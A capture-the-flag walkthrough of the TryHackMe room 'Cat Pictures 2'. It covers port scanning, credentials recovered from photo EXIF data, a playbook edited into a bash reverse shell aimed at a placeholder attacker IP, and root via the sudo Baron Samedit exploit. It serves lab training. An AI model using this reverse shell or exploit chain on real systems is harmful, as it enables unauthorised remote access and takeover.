Cat Pictures 2 Writeup :-
copycat  1


This is a walkthrough of the Cat Pictures 2 CTF from TryHackMe. The room can be accessed here.

Recon
I started by running an Nmap scan to identify open ports on the target machine:

nmap -sV -sC -p- <#TARGETIP> -o nmap
The scan revealed the following open ports:

22 - OpenSSH 7.6p1
80 - Nginx 1.4.6 (Lychee version 3.1.1 photo album with cat pictures)
222 - OpenSSH 9.0 (Unusual port)
1337 - OliveTin (Web interface to run predefined shell commands)
3000 - Gitea (Lightweight DevOps platform)
8080 - Nginx default webpage (Possibly with subdirectories)



Web Pages
I began exploring the web applications hosted on different ports:

Port 80: Found a Lychee photo album with cat pictures. App Screenshot

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/d2051fdc-db05-4bf4-9f99-d06dd6d542f4)

Port 1337: Discovered OliveTin, a web interface to execute scripts and run Ansible Playbooks.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/093190b3-7acb-4dba-82d7-41771ec4aeeb)


Port 3000: Accessed Gitea, a platform that might be hosting scripts and runbooks.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/207f713a-da48-4047-80f4-a0609e988d6e)


Port 8080: Default Nginx webpage, further inspection may reveal subdirectories.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/c179008c-b9a3-40d4-9be8-6fd9f28c8072)


After running gobuster and checking for vulnerabilities, nothing significant was found. So, I focused on the cat pictures hosted on port 80.

Cat Pictures Analysis
I downloaded all the cat pictures and checked them for exif data using exiftool. One picture revealed interesting information of a text file on a subdomain of one of the web applications:

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/c91f7af5-edac-44ba-bade-f88f2c3b6dff)



Visiting the URL led me to a text file with the following information:

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/ab49ed38-a550-43f6-b7e5-bf3998e428e7)


I managed to gain access to the website with the credentials from the text file and explored the user's repository, where I found flag1.txt (1/3 flags).

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/aa2c518c-8143-4cf9-b9d2-149811346e10)



Ansible Playbook
Next, I inspected the playbook.yaml file and noticed it contains a shell command: shell: echo hi.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/5db2eec5-7414-4daa-901d-3fac4be9fb8b)


Knowing that OliveTin on port 1337 allows running Ansible Playbooks, I replaced the command with simple bash reverse shell payload from RevShells.com.

bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
Setting up a NetCat listener and clicking "Run Ansible Playbook" triggered the payload, which gave me a shell on the box. Exploring the user directory file gave me another text file named flag2.txt (2/3 flags).

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/92e09b2a-92f4-447f-a4c4-29a5d40e2e76)


Privilege Escalation
With a reverse shell on the target machine, I looked around for interesting files and uploaded linpeas.sh to find vulnerabilities. One stood out: [CVE-2021-3156] sudo Baron Samedit.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/f2c7c2eb-21c7-460c-899e-b0cff63c0a04)


To exploit this, I downloaded the exploit, uploaded it to the target machine, compiled it with make, and executed the ./sudo-hax-me-a-sandwich outfile to gain root access.

![image](https://github.com/Sabhareesh2002/Cat-picture---Tryhackme/assets/75512455/5a436b51-10a6-417d-ac50-6054beea73df)


From here, I moved to the /root file directory and found the flag3.txt (3/3 flags).

Thanks for checking out my writeup! Feel free to reach out with any questions or comments.
